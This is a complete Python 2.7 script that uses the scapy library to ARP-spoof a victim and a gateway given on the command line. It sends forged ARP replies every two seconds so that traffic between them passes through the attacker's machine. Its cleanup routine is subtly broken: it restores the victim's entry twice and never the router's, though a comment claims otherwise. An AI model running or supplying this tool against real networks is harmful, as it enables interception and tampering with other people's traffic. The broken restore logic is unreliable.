#!/usr/bin/python2.7

import scapy.all as scapy
import time
import sys
import argparse

def get_ip():

	parser=argparse.ArgumentParser()	
	parser.add_argument("-t","--target",dest="victim",help="Specify Victim IP addres")
	parser.add_argument("-s","--spoof",dest="spoof",help="Specify Spoofing IP addres")
	options = parser.parse_args()

	if not options.victim:
		parser.error("[-] Specify an IP Address for victim --help for more details")

	if not options.spoof:
		parser.error("[-] Specify an IP Address for spoofing --help for more details")

	return options

ip = get_ip()

target_ip = ip.victim
gateway_ip = ip.spoof

def getmac(ip):
	
	arp_request = scapy.ARP(pdst = ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
	
	return  answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):

	dst_mac = getmac(target_ip)
	arp_respond = scapy.ARP(op=2,pdst=target_ip,hwdst=dst_mac,psrc=spoof_ip)
	#arp_respond = scapy.ARP(op="1 for request 2 for respond,pdst="victim-ip",hwdst="victim-mac",psrc="Router-ip")
	scapy.send(arp_respond,verbose=False)

def restore(destination_ip,source_ip):

	dst_mac=getmac(destination_ip)
	src_mac=getmac(source_ip)
	arp_respond = scapy.ARP(op=2,pdst=destination_ip,hwdst=dst_mac,psrc=source_ip,hwsrc=src_mac)
	scapy.send(arp_respond,verbose=False,count=4)

count = 0
try:
	while True:
		spoof(target_ip,gateway_ip)
		#telling client i am the router
		spoof(gateway_ip,target_ip)
		#telling router i am the client
		count = count + 2
		print "\r[+] send two packets "+str(count),
		sys.stdout.flush()
		time.sleep(2)

except KeyboardInterrupt:

		print "\n[+] Detected CTRL+C Quitting and restoring arp value please wait"
		restore(target_ip,gateway_ip)
		#restoring client
		restore(target_ip,gateway_ip)
		#restoring router